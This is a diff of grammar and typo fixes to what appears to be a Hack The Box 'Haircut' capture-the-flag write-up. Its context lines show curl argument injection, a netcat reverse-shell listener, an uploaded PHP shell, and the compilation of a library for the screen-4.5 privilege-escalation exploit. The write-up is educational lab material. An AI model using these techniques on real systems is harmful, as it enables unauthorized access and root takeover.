@@ -18,7 +18,7 @@ tags:
 
 ![haircut](/assets/images/2020-06-04-21-28-52.png)
 
-Haircut is rated medium, although compared some of other boxes it is relatively simple. It's main purpose is to demonstrate the problem with unsanitsed user inputs for CURL arguments. Skills required are basic knowledge of Linux, and enumerating ports and services. Skills learned are command injections and exploit software vulnerabilities to escalate to root.
+Haircut is rated medium, although compared some other boxes it is relatively simple. It's main purpose is to demonstrate the problem with unsanitsed user inputs for CURL arguments. Skills required are basic knowledge of Linux, and enumerating ports and services. Skills learned are command injections and exploiting software vulnerabilities to escalate to root.
 
 <!--more-->
 
@@ -116,12 +116,11 @@ Just a text box with with what looks to be a test file pre-entered, try clicking
 
 ![exposed_test](/assets/images/2020-06-04-21-47-58.png)
 
-The output and the picture are clues that suggest the text box is taking what is answered as a parameter to pass to curl. We can test this by starting a web server on our Kali machine:
+The output and the picture are clues that suggest the text box is taking what is entered as a parameter, and passing it to curl. We can test this by starting a web server on our Kali machine:
 
 ```text
 root@kali:~/htb/haircut# python -m SimpleHTTPServer
 Serving HTTP on 0.0.0.0 port 8000 ...
-10.10.10.24 - - [04/Jun/2020 16:46:30] "GET / HTTP/1.1" 200 -
 ```
 
 Now try entering our local IP to see if we can connect to our web server:
@@ -132,7 +131,7 @@ We get a connection, so let's see if we can do command injection:
 
 ![try_ls](/assets/images/2020-06-04-21-54-52.png)
 
-Nope, there is some level of checking our input. Let's see if we can get curl to display its help:
+Nope, there is some level of checking against our input. Let's see if we can get curl to display its help:
 
 ![curl_help](/assets/images/2020-06-04-21-55-14.png)
 
@@ -178,7 +177,7 @@ root@kali:~/htb/haircut# nc -nlvp 1234
 listening on [any] 1234 ...
 ```
 
-Now back on box we brose to the uploaded shell:
+Now back on box we browse to the uploaded shell:
 
 ![open_shell_php](/assets/images/2020-06-04-21-57-35.png)
 
@@ -234,7 +233,7 @@ www-data@haircut:/$ find / -perm -4000 2>/dev/null
 /bin/umount
 /usr/bin/sudo
 /usr/bin/pkexec
-/usr/bin/screen-4.5./usr/lib/openssh/
+/usr/bin/screen-4.5.
 <SNIP>
 ```
 
@@ -284,7 +283,7 @@ root@kali:~/htb/haircut# cat << EOF > /tmp/libhax.c
 > EOF
 ```
 
-File libhax.c creating containing the above, now need to compile it:
+File libhax.c created containing the above, now need to compile it:
 
 ```text
 root@kali:~/htb/haircut# gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
@@ -355,7 +354,7 @@ HTTP request sent, awaiting response... 200 OK
 Length: 16824 (16K) [application/octet-stream]
 Saving to: 'rootshell.1'
 rootshell.1         100%[===================>]  16.43K  --.-KB/s    in 0.03s
-2020-06-04 22:16:23 (514 KB/s) - 'rootshell.1' saved [16824/16824]
+2020-06-04 22:16:23 (514 KB/s) - 'rootshell' saved [16824/16824]
 ```
 
 Now we can try to escalate, first run screen:
